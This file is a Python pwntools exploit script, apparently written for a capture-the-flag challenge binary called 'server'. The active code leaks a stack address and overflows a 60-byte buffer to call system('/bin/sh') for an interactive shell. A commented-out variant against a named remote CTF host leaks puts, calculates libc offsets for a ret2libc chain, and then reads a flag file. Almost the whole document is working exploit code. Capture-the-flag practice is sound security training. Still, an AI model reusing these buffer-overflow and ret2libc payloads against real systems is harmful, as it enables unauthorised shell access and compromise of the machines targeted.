from pwn import context, log, p32, remote, sys

context.binary = '../../files/server'
elf = context.binary

def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1], int(sys.argv[2])
    return remote(host, port)


def main():
    p = get_process()

    p.recvuntil(b'address')
    p.recvline()

    stack_addr = int(p.recvline().split()[0].decode(), 16)
    log.info(f'Leaked an address on the stack: {hex(stack_addr)}')  

    offset = 60
    junk = b'A' * offset

    payload  = junk
    payload += p32(elf.plt.system)
    payload += p32(0)
    payload += p32(stack_addr + 0x48)
    payload += b'/bin/sh'

    p.sendlineafter(b'Input some text: ', payload)
    p.recvuntil(b'Return')
    p.recv()

    p.interactive()

if __name__ == '__main__':
    main()

# import pwn

# host = "thekidofarcrania.com"
# port = 4902
# target = "../../files/server"


# def create_process(remote):
#     if remote:
#         return pwn.remote(host, port)
#     else:
#         return pwn.process(targtet)

# def exploit(remote):
#     pr = create_process(remote) 

#     try:
#         elf = pwn.ELF(target, False)

#         puts_plt = elf.plt['puts']
#         puts_got = elf.got['puts']
#         payload = b'\x90'*60
#         payload += pwn.p32(puts_plt)
#         payload += pwn.p32(elf.sym["main"])
#         payload += pwn.p32(puts_got)

#         pr.sendlineafter("Input some text: ", payload)
#         pr.readuntil('Return address: ')
#         pr.readline()
#         pr.readline()
#         puts_addr = int.from_bytes(pr.read(4).strip().ljust(4, b'\x00'), 'little')
#         print('puts', hex(puts_addr))

#         # https://libc.blukat.me/?q=puts%3A0xf7d98b40&l=libc6_2.27-3ubuntu1_i386
#         sys_addr = puts_addr - 0x2a940
#         binsh_addr = puts_addr + 0x11658f
#         exit_addr = puts_addr - 227184
#         print('sys', hex(sys_addr))
#         print('binsh', hex(binsh_addr))
#         payload = b'\x90'*60
#         payload += pwn.p32(sys_addr)
#         payload += pwn.p32(exit_addr)
#         payload += pwn.p32(binsh_addr)

#         pr.sendlineafter("Input some text: ", payload)
#         pr.sendline("cat /flag2.txt")
#         print(pr.readall(2).decode())
#     except Exception as ex:
#         print(ex)
#     finally:
#             pr.close()

# exploit(True)